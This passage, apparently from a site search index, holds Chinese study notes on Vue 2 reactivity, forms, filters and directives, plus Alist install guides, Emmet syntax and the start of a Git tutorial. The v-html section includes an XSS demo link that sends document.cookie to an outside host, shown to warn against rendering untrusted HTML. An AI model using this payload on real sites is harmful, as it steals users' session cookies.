name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue.set的使用</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"root\\\"> <h2>学校名称：{{name}}</h2> <h2>学校地址：{{address}}</h2> <hr /> <h1>学生信息</h1> <button @click=\\\"addSex\\\">添加一个性别，默认值男</button> <h2>学生姓名：{{student.name}}</h2> <h2 v-if=\\\"student.sex\\\">学生性别：{{student.sex}}</h2> <h2>学生年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2> <h2>朋友们</h2> <ul> <li v-for=\\\"(f,index) in student.friends\\\" :key=\\\"index\\\"> {{f.name}}--{{f.age}} </li> </ul> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', student: { name: 'tom', age: { rAge: 21, sAge: 18, }, friends: [ { name: 'jerry', age: 23 }, { name: 'tony', age: 24 }, ], }, }, methods: { addSex() { //Vue.set(this.student, 'sex', '男') this.$set(this.student, 'sex', '男') }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视11.gif\",\"接下来我们研究一下 Vue 是如何监测数组里面属性的改变的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue监测数据改变的原理-数组</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>学校名称：{{name}}</h2> <h2>学校地址：{{address}}</h2> <hr /> <h1>学生信息</h1> <button @click=\\\"addSex\\\">添加一个性别，默认值男</button> <h2>学生姓名：{{student.name}}</h2> <h2 v-if=\\\"student.sex\\\">学生性别：{{student.sex}}</h2> <h2>学生年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2> <h2>朋友们</h2> <ul> <li v-for=\\\"(f,index) in student.friends\\\" :key=\\\"index\\\"> {{f.name}}--{{f.age}} </li> </ul> <h2>爱好</h2> <ul> <li v-for=\\\"(h,index) in student.hobby\\\" :key=\\\"index\\\">{{h}}</li> </ul> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', student: { name: 'tom', age: { rAge: 21, sAge: 18, }, hobby: ['唱', '跳', 'rap'], friends: [ { name: 'jerry', age: 23 }, { name: 'tony', age: 24 }, ], }, }, methods: { addSex() { //Vue.set(this.student, 'sex', '男') this.$set(this.student, 'sex', '男') }, }, }) </script> </body> </html> \",\"我们在控制台中会发现：\",\"Vue 核心-列表渲染与数据监视12.png\",\"数组中的数据并没有 getter 和 setter 方法，这也就解释了上面的更新数组的问题\",\"总结\",\"vue 会监视 data 中所有层次的数据\",\"如何监测对象中的数据？通过 setter 实现监视，且要在 new Vue() 时就传入要监测的数据 \",\"对象创建后追加的属性，Vue 默认不做响应式处理\",\"如需给后添加的属性做响应式，请使用如下 API Vue.set(target,propertyName/index,value) 或 vm.$set(target,propertyName/index,value)\",\"如何监测数组中的数据？ 通过包裹数组更新元素的方法实现，本质就是做了两件事 \",\"调用原生对应的方法对数组进行更新\",\"重新解析模板，进而更新页面\",\"在 Vue 修改数组中的某个元素一定要用如下方法 \",\"push() 、pop() 、unshift()、shift()、splice()、sort()、reverse() ，这几个方法被 Vue 重写了\",\"Vue.set() 或 vm.$set()，特别注意：Vue.set() 和 vm.$set() 不能给 vm 或 vm 的根数据对象（data 等）添加属性\",\"综合案例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>总结数据监视</title> <style> button { margin-top: 10px; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h1>学生信息</h1> <button @click=\\\"student.age++\\\">年龄+1岁</button> <br /> <button @click=\\\"addSex\\\">添加性别属性，默认值：男</button> <br /> <button @click=\\\"student.sex = '未知' \\\">修改性别</button> <br /> <button @click=\\\"addFriend\\\">在列表首位添加一个朋友</button> <br /> <button @click=\\\"updateFirstFriendName\\\"> 修改第一个朋友的名字为：张三 </button> <br /> <button @click=\\\"addHobby\\\">添加一个爱好</button> <br /> <button @click=\\\"updateHobby\\\">修改第一个爱好为：开车</button> <br /> <button @click=\\\"removeSmoke\\\">过滤掉爱好中的rap</button> <br /> <h3>姓名：{{ student.name }}</h3> <h3>年龄：{{ student.age }}</h3> <h3 v-if=\\\"student.sex\\\">性别：{{student.sex}}</h3> <h3>爱好：</h3> <ul> <li v-for=\\\"(h,index) in student.hobby\\\" :key=\\\"index\\\">{{ h }}</li> </ul> <h3>朋友们：</h3> <ul> <li v-for=\\\"(f,index) in student.friends\\\" :key=\\\"index\\\"> {{ f.name }}--{{ f.age }} </li> </ul> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { student: { name: 'tom', age: 18, hobby: ['唱', '跳', 'rap'], friends: [ { name: 'jerry', age: 35 }, { name: 'tony', age: 36 }, ], }, }, methods: { addSex() { // Vue.set(this.student,'sex','男') this.$set(this.student, 'sex', '男') }, addFriend() { this.student.friends.unshift({ name: 'jack', age: 70 }) }, updateFirstFriendName() { this.student.friends[0].name = '张三' }, addHobby() { this.student.hobby.push('学习') }, updateHobby() { // this.student.hobby.splice(0,1,'开车') // Vue.set(this.student.hobby,0,'开车') this.$set(this.student.hobby, 0, '开车') }, removeSmoke() { this.student.hobby = this.student.hobby.filter((h) => { return h !== 'rap' }) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue 核心-列表渲染与数据监视13.gif\"]}]},\"/front-end/vue-notes/10-Vue%E6%A0%B8%E5%BF%83-%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE.html\":{\"title\":\"Vue核心-收集表单数据\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/10-Vue核心-收集表单数据\"]},{\"header\":\"收集表单数据\",\"slug\":\"收集表单数据\",\"contents\":[\"收集表单数据\",\"若 <input type=\\\"text\\\"/>，则 v-model 收集的是 value 值，用户输入的内容就是 value 值\",\"若 <input type=\\\"radio\\\"/>，则 v-model 收集的是 value 值，且要给标签配置 value 属性\",\"若 <input type=\\\"checkbox\\\"/>\",\"没有配置 value 属性，那么收集的是 checked 属性（勾选 or 未勾选，是布尔值）\",\"配置了 value 属性 \",\"v-model 的初始值是非数组，那么收集的就是 checked（勾选 or 未勾选，是布尔值）\",\"v-model 的初始值是数组，那么收集的就是 value 组成的数组\",\"v-model 的三个修饰符：\",\"lazy 失去焦点后再收集数据\",\"number 输入字符串转为有效的数字\",\"trim 输入首尾空格过滤\",\"form 表单中 @submit.prevent 作用方法\",\"<form @submit.prevent=\\\"Demo\\\"></form> \",\"submit：表示通常与 form 联合使用，在表单中有提交或按钮，立马触发后面紧跟的方法\",\".prevent：表示阻止默认事件的修饰符，提交以后不会刷新页面。阻止默认事件就是指有些标签本身会存在事件，如 a 标签的跳转，form 表单中的 submit 按钮的提交事件等，某些时候想执行自己设置的事件，这个时候就需要阻止标签的默认事件的执行。在 Vue 中，只需要使用 .prevent 修饰符就可以\",\"注：.prevent 不一定非要跟 submit 绑定在一起\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>收集表单数据</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <form @submit.prevent=\\\"test\\\"> 账号：<input type=\\\"text\\\" v-model.trim=\\\"userInfo.account\\\" /><br /> 密码：<input type=\\\"password\\\" v-model=\\\"userInfo.passWord\\\" /><br /> 年龄：<input type=\\\"number\\\" v-model.number=\\\"userInfo.age\\\" /><br /> 性别：<br /> 男<input type=\\\"radio\\\" v-model=\\\"userInfo.sex\\\" value=\\\"male\\\" /> 女<input type=\\\"radio\\\" v-model=\\\"userInfo.sex\\\" value=\\\"female\\\" /><br /> 爱好：<br /> 学习<input type=\\\"checkbox\\\" v-model=\\\"userInfo.hobby\\\" value=\\\"study\\\" /> 打游戏<input type=\\\"checkbox\\\" v-model=\\\"userInfo.hobby\\\" value=\\\"game\\\" /> 吃饭<input type=\\\"checkbox\\\" v-model=\\\"userInfo.hobby\\\" value=\\\"eat\\\" /> <br /> 所属校区: <br /> <select v-model=\\\"userInfo.area\\\"> <option value=\\\"\\\">请选择校区</option> <option value=\\\"QuFuL\\\">曲阜老校区</option> <option value=\\\"QuFuX\\\">曲阜新校区</option> <option value=\\\"RiZhao\\\">日照校区</option> </select> <br /> 其他信息：<br /> <textarea v-model.lazy=\\\"userInfo.other\\\"></textarea> <br /> <input type=\\\"checkbox\\\" v-model=\\\"userInfo.agree\\\" />阅读并接受 <a href=\\\"https://www.qfnu.edu.cn\\\">《用户协议》</a> <br /> <button>提交</button> </form> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { userInfo: { account: '', passWord: '', age: 18, sex: 'female', hobby: [], area: '', other: '', agree: '', }, }, methods: { test() { console.log(JSON.stringify(this.userInfo)) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-收集表单数据01.png\"]}]},\"/front-end/vue-notes/11-Vue%E6%A0%B8%E5%BF%83-%E8%BF%87%E6%BB%A4%E5%99%A8.html\":{\"title\":\"Vue核心-过滤器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/11-Vue核心-过滤器\"]},{\"header\":\"过滤器 (Vue 3 已经移除)\",\"slug\":\"过滤器-vue-3-已经移除\",\"contents\":[\"定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）\",\"注册过滤器：Vue.filter(name, callback) 全局过滤器new Vue {filters: {}} 局部过滤器\",\"使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = \\\"xxx | 过滤器名\\\"\",\"备注：\",\"过滤器可以接收额外参数，多个过滤器也可以串联\",\"并没有改变原本的数据，而是产生新的对应的数据\",\"处理时间的库：moment 体积较大，dayjs 轻量级\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>过滤器</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <!-- //引入dayjs库 --> <script src=\\\"https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>时间</h2> <h3>当前时间戳：{{time}}</h3> <h3>转换后的时间：{{time|timeFilter()}}</h3> <h3>转换后的时间：{{time|timeFilter('YYYY-MM-DD HH:mm:ss')}}</h3> <h3>截取年月日：{{time|timeFilter() | mySlice}}</h3> </div> <script> Vue.config.productionTip = false //全局过滤器 Vue.filter('mySlice', function (value) { return value.slice(0, 11) }) new Vue({ el: '#root', data: { time: 1683621034195, }, //局部过滤器 filters: { timeFilter(value, str = 'YYYY年MM月DD日HH:mm:ss') { return dayjs(value).format(str) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-过滤器01.png\"]}]},\"/front-end/vue-notes/12-Vue%E6%A0%B8%E5%BF%83-%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4%E4%B8%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4.html\":{\"title\":\"Vue核心-内置指令与自定义指令\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/12-Vue核心-内置指令与自定义指令\"]},{\"header\":\"内置指令\",\"slug\":\"内置指令\",\"contents\":[\"常用的内置指令： v-bind 单向绑定解析表达式，可简写为 :v-model 双向数据绑定v-for 遍历数组 / 对象 / 字符串v-on 绑定事件监听，可简写为 @v-show 条件渲染 (动态控制节点是否展示)v-if 条件渲染（动态控制节点是否存在）v-else-if 条件渲染（动态控制节点是否存在）v-else 条件渲染（动态控制节点是否存在）\"]},{\"header\":\"v-text 指令\",\"slug\":\"v-text-指令\",\"contents\":[\"v-text 指令\",\"作用：向其所在的节点中渲染文本内容\",\"与插值语法的区别：v-text 会替换掉节点中的内容，{{xxx}} 则不会，更灵活\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-text指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <div>你好，{{name}}</div> <div v-text=\\\"name\\\"></div> <div v-text=\\\"str\\\"></div> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', str: '<h3>你好呀！</h3>', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令01.png\"]},{\"header\":\"v-html 指令\",\"slug\":\"v-html-指令\",\"contents\":[\"作用：向指定节点中渲染包含 html 结构的内容\",\"与插值语法的区别：\",\"v-html 会替换掉节点中所有的内容，{{xxx}} 则不会\",\"v-html 可以识别 html 结构\",\"严重注意 v-html 有安全性问题！！！\",\"在网站上动态渲染任意 html 是非常危险的，容易导致 XSS 攻击\",\"一定要在可信的内容上使用 v-html，永远不要用在用户提交的内容上！！！\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-html指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <div>你好，{{name}}</div> <div v-html=\\\"str1\\\"></div> <div v-html=\\\"str2\\\"></div> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', str1: '<h3>你好呀！</h3>', str2: '<a href=javascript:location.href=\\\"http://www.baidu.com?\\\"+document.cookie>兄弟我找到你想要的资源了，快来！</a>', }, }) </script> </body> </html> \",\"我们在 cookie 中存放如下数据\",\"Vue核心-内置指令与自定义指令02.png\",\"点击案例中的链接就可以获取\",\"效果：\",\"Vue核心-内置指令与自定义指令03.gif\"]},{\"header\":\"v-cloak 指令\",\"slug\":\"v-cloak-指令\",\"contents\":[\"v-cloak 指令（没有值）\",\"本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 v-cloak 属性\",\"使用 CSS 配合 v-cloak 可以解决网速慢时页面展示出 {{xxx}} 的问题\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-cloak指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <style> [v-cloak] { display: none; } </style> </head> <body> <div id=\\\"root\\\"> <!-- 如果网速慢则一开始不显示 --> <h2 v-cloak>{{name}}</h2> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', }, }) </script> </body> </html> \"]},{\"header\":\"v-once 指令\",\"slug\":\"v-once-指令\",\"contents\":[\"v-once 所在节点在初次动态渲染后，就视为静态内容了\",\"以后数据的改变不会引起 v-once 所在结构的更新，可以用于优化性能\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-once指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2 v-once>初始化的n值是：{{n}}</h2> <h2>当前的n值是：{{n}}</h2> <button @click=\\\"n++\\\">点我n+1</button> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { n: 1, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令04.gif\"]},{\"header\":\"v-pre 指令\",\"slug\":\"v-pre-指令\",\"contents\":[\"跳过 v-pre 所在节点的编译过程\",\"可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-pre指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2 v-pre>Vue其实很简单</h2> <h2>当前的n值是:{{n}}</h2> <button @click=\\\"n++\\\">点我n+1</button> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { n: 1, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令05.gif\"]},{\"header\":\"自定义指令\",\"slug\":\"自定义指令\",\"contents\":[\"directives\"]},{\"header\":\"定义语法\",\"slug\":\"定义语法\",\"contents\":[]},{\"header\":\"局部指令\",\"slug\":\"局部指令\",\"contents\":[\"new Vue({ directives:{ 指令名:配置对象 } }) \",\"或\",\"new Vue({ directives:{ 指令名:回调函数 } }) \",\"例：\",\"directives : { 'my-directive' : { bind (el, binding) { el.innerHTML = binding.value.toupperCase() } } } \"]},{\"header\":\"全局指令\",\"slug\":\"全局指令\",\"contents\":[\"Vue.directive(指令名, 配置对象) \",\"或\",\"Vue.directive(指令名, 回调函数) \",\"例：\",\"Vue.directive('my-directive', function(el, binding){ el.innerHTML = binding.value.toupperCase() }) \"]},{\"header\":\"配置对象中常用的3个回调函数\",\"slug\":\"配置对象中常用的3个回调函数\",\"contents\":[\"bind (element, binding) 指令与元素成功绑定时调用\",\"inserted (element, binding) 指令所在元素被插入页面时调用\",\"update(element, binding) 指令所在模板结构被重新解析时调用\",\"element 就是 DOM 元素，binding 就是要绑定的对象，它包含以下属性：name 、value、oldValue、expression、arg、modifiers\",\"例：\",\"Vue.directive('fbind', { // 指令与元素成功绑定时（一上来） bind(element, binding) { // element就是DOM元素，binding就是要绑定的 element.value = binding.value }, // 指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, // 指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value } }) \"]},{\"header\":\"注意\",\"slug\":\"注意\",\"contents\":[\"指令定义时不加 v-，但使用时要加 v-\",\"指令名如果是多个单词，要使用 kebab-case 命名方式，不要用 camelCase 命名\"]},{\"header\":\"使用指令\",\"slug\":\"使用指令\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>自定义指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>当前n值是：<span v-text=\\\"n\\\"></span></h2> <h2>放大10倍后的n值是：<span v-big=\\\"n\\\"></span></h2> <button @click=\\\"n++\\\">点我n+1</button> <hr /> <input type=\\\"text\\\" v-fbind:value=\\\"n\\\" /> </div> <script> Vue.config.productionTip = false //定义全局指令 /*Vue.directive('fbind', { //指令与元素成功绑定时（一上来） bind(element, binding) { element.value = binding.value }, //指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, //指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value }, })*/ new Vue({ el: '#root', data: { n: 1, }, directives: { //big函数何时会被调用？ //1.指令与元素成功绑定时（一上来） //2.指令所在的模板被重新解析时 big(element, binding) { //console.log('big', this) //注意此处的this是window element.innerText = binding.value * 10 }, fbind: { //指令与元素成功绑定时（一上来） bind(element, binding) { element.value = binding.value }, //指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, //指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value }, }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令06.gif\"]}]},\"/front-end/vue-notes/\":{\"title\":\"Vue笔记\",\"contents\":[]},\"/software-tool/alist/01-%E5%AE%89%E5%8D%93%E7%AB%AF%E5%AE%89%E8%A3%85Alist.html\":{\"title\":\"安卓端安装Alist\",\"contents\":[{\"header\":\"安装 termux\",\"slug\":\"安装-termux\",\"contents\":[\"从 F-Droid 下载 termux 和 Termux:Widget\",\"更换清华源：termux | 镜像站使用帮助 | 清华大学开源软件镜像站\"]},{\"header\":\"安装 Alist\",\"slug\":\"安装-alist\",\"contents\":[\"在 termux 中输入如下命令：\",\"apt update && apt install alist \",\"安装成功后输入如下命令查看管理员密码：\",\"alist admin \",\"复制密码备用\",\"启动 Alist\",\"alist server \",\"进入 localhost:5244 访问即可\"]},{\"header\":\"添加存储\",\"slug\":\"添加存储\",\"contents\":[\"查看官方文档即可AList文档\"]},{\"header\":\"设置一键启动脚本\",\"slug\":\"设置一键启动脚本\",\"contents\":[\"下载 vim\",\"pkg install vim \",\"建立文件夹\",\"mkdir .shortcuts \",\"进入文件夹\",\"cd .shortcuts \",\"编辑脚本\",\"vim start_alist.sh \",\"进入脚本编辑界面，按 i 进入编辑模式，输入以下内容\",\"alist server \",\"输入完成后，按 esc 退出，输入 :wq 保存\",\"进入桌面，添加安卓小部件，将脚本添加到桌面即可\"]},{\"header\":\"更新\",\"slug\":\"更新\",\"contents\":[\"在 termux 中输入 pkg upgrade alist 即可\"]}]},\"/software-tool/alist/02-Windows%E7%AB%AF%E5%AE%89%E8%A3%85Alist.html\":{\"title\":\"Windows端安装Alist\",\"contents\":[{\"header\":\"安装\",\"slug\":\"安装\",\"contents\":[\"Alist\",\"去 releases 里下载最新版 Windows 安装包\",\"下载完成后解压即可\",\"然后在文件资源管理器中找到 alist.exe 文件，在地址栏输入 cmd 后回车\",\"进入命令提示符后输入 alist server 即可\",\"进入浏览器进入 localhost:5244 即可访问\",\"使用 alist admin 命令可以查看管理员密码\"]},{\"header\":\"开机自启\",\"slug\":\"开机自启\",\"contents\":[\"在 alist.exe 文件的目录里新建一个文件名为 alist.vbs\",\"文件内容为：\",\"Set ws = CreateObject(\\\"Wscript.Shell\\\") ws.run \\\"alist.exe server\\\",vbhide \",\"然后右键该文件创建快捷方式，将快捷方式剪切，在地址栏输入 shell:startup\",\"将快捷方式粘贴进来即可\"]},{\"header\":\"更新\",\"slug\":\"更新\",\"contents\":[\"去官网下载最新安装包，将 alist.exe 文件替换为最新的即可\"]}]},\"/software-tool/alist/\":{\"title\":\"Alist\",\"contents\":[]},\"/software-tool/emmet/01-Emmet%E8%AF%AD%E6%B3%95.html\":{\"title\":\"Emmet语法\",\"contents\":[{\"header\":\"简介\",\"slug\":\"简介\",\"contents\":[\"Emmet 语法的前身是 Zen coding, 它使用缩写, 来提高 html/css 的编写速度, Vscode 内部已经集成该语法\"]},{\"header\":\"快速生成 HTML 结构语法\",\"slug\":\"快速生成-html-结构语法\",\"contents\":[\"生成标签直接输入标签名按 tab 键即可比如 div 然后 tab 键，就可以生成 <div></div>\",\"如果想要生成多个相同标签加上 * 就可以了比如 div*3 就可以快速生成 3 个 div\",\"如果有父子级关系的标签，可以用 > 比如 ul > li 就可以了\",\"如果有兄弟关系的标签，用 + 就可以了比如 div+p\",\"如果生成带有类名或者 id 名字的，直接写 .demo 或者 #two tab 键就可以了\",\"如果生成的 div 类名是有顺序的，可以用自增符号 $\",\"如果想要在生成的标签内部写内容可以用 { } 表示\"]},{\"header\":\"快速生成 CSS 样式语法\",\"slug\":\"快速生成-css-样式语法\",\"contents\":[\"CSS 基本采取简写形式即可\",\"比如 w 200 按 tab 可以生成 width: 200 px;\",\"比如 lh 26 px 按 tab 可以生成  line-height: 26 px;\"]}]},\"/software-tool/emmet/\":{\"title\":\"Emmet\",\"contents\":[]},\"/software-tool/git/01-Git%E6%95%99%E7%A8%8B.html\":{\"title\":\"Git教程\",\"contents\":[{\"header\":\"Git 简介\",\"slug\":\"git-简介\",\"contents\":[\"Git 是目前世界上最先进的分布式版本控制系统。\",\"版本控制系统（version control system）, 是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。\"]},{\"header\":\"Git 的诞生\",\"slug\":\"git-的诞生\",\"contents\":[\"Git 是由 Linux 之父 Linus 开发的，在 2005 年 4 月 3 号开始开发，到 4 月 7 号仅四天时间 Git 就可以投入使用了。到同年 6 月份，Linux 已经在使用 Git 管理代码了。\",\"Git 是用什么语言开发的：C 语言。\"]},{\"header\":\"集中式 vs 分布式\",\"slug\":\"集中式-vs-分布式\",\"contents\":[\"集中式和分布式的区别是： 你的本地是否有完整的版本库历史！ 假设 SVN 服务器没了，那你丢掉了所有历史信息，因为你的本地只有当前版本以及部分历史信息。必须联网才能工作。 假设 GitHub 服务器没了，你不会丢掉任何 git 历史信息，因为你的本地有完整的版本库信息。你可以把本地的 git 库重新上传到另外的 git 服务商。可以离线工作。\"]},{\"header\":\"安装 Git\",\"slug\":\"安装-git\",\"contents\":[\"在 Windows 上使用 Git，可以从 Git 官网直接下载安装程序，然后按默认选项安装即可。\",\"安装完成后，在开始菜单里找到“Git”->“Git Bash”，会出现一个类似如下图命令行窗口的东西，就说明 Git 安装成功！\",\"Git教程01.png\"]},{\"header\":\"Git 初始化\",\"slug\":\"git-初始化\",\"contents\":[]},{\"header\":\"设置用户签名\",\"slug\":\"设置用户签名\",\"contents\":[\"签名的作用就是用来标识用户，以区分不同的开发人员\",\"==安装完成后，还需要最后一步设置，==在命令行输入：\",\"$ git config --global user.name \\\"Your Name\\\" $ git config --global user.email \\\"email@example.com\\\" \",\"注意 git config 命令的 --global 参数，用了这个参数，表示你这台机器上所有的 Git 仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和 Email 地址。\"]},{\"header\":\"初始化仓库\",\"slug\":\"初始化仓库\",\"contents\":[\"如果你使用 Windows 系统，为了避免遇到各种莫名其妙的问题，请确保目录名（包括父目录）不包含中文。\",\"通过 git init 命令可以把目录变成 Git 可以管理的仓库：\",\"# git 初始化的指令 $ git init \",\"瞬间 Git 就把仓库建好了，而且告诉你是一个空的仓库（empty Git repository），可以发现当前目录下多了一个 .git 的目录，这个目录是 Git 来跟踪仓库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把 Git 仓库给破坏了。\",\"如果你没有看到 .git 目录，那是因为这个目录默认是隐藏的，用 ls -ah 命令就可以看见。\",\"也不一定必须在空目录下创建 Git 仓库，选择一个已经有东西的目录也是可以的。\"]},{\"header\":\"Git 工作机制\",\"slug\":\"git-工作机制\",\"contents\":[\"分为 Git 工作区、暂存区和版本库 具体流程：代码提交到暂存区（暂时保存），然后暂存区提交到 master 分支（版本库）\"]},{\"header\":\"Git 工作区\",\"slug\":\"git-工作区\",\"contents\":[\"在电脑里面能够看得到的项目目录，但是项目目录下隐藏了一个 .git 目录，这个目录不属于工作区，而是版本库\"]},{\"header\":\"Git 暂存区\",\"slug\":\"git-暂存区\",\"contents\":[\"英文叫 stage 或 index。一般存放在 .git 目录下的 index 文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）。\"]},{\"header\":\"Git 版本库\",\"slug\":\"git-版本库\",\"contents\":[\".git 目录就是版本库\"]},{\"header\":\"托管平台\",\"slug\":\"托管平台\",\"contents\":[\"局域网（内网） \",\"GitLab\",\"公网（外网） \",\"GitLab\",\"GitHub\",\"Gitee\"]},{\"header\":\"添加文件到暂存区\",\"slug\":\"添加文件到暂存区\",\"contents\":[\"我们要放入暂存区，要使用 git add 命令\",\"把单独一个文件放在暂存区\",\"# 把文件夹下的index.txt文本放在暂存区 $ git add index.txt \",\"把单独一个文件夹放在暂存区（暂存区不能存放空文件夹）\",\"# 把文件夹下的test文件夹放在暂存区 $ git add test/ \",\"把所有文件都放在暂存区\",\"# 把文件夹下所有的内容都放在暂存区 $ git add --all # git add --all 有一个简单的写法 $ git add . \",\"可以使用 git status 命令来掌握仓库当前的状态可以使用 git rm --cached <file>... 命令来从暂存区中删除 file\"]},{\"header\":\"提交暂存区到本地仓库\",\"slug\":\"提交暂存区到本地仓库\",\"contents\":[\"将暂存区文件提交到本地仓库，使用 git commit 命令\",\"# 把暂存区的内容放到本地仓库 $ git commit -m \\\"备注\\\" \",\"我们使用 git log 命令来查看版本信息\",\"# 查看当前历史区版本信息 $ git log \"]},{\"header\":\"版本穿梭\",\"slug\":\"版本穿梭\",\"contents\":[]},{\"header\":\"版本回退\",\"slug\":\"版本回退\",\"contents\":[\"使用 git reset --hard 版本编号 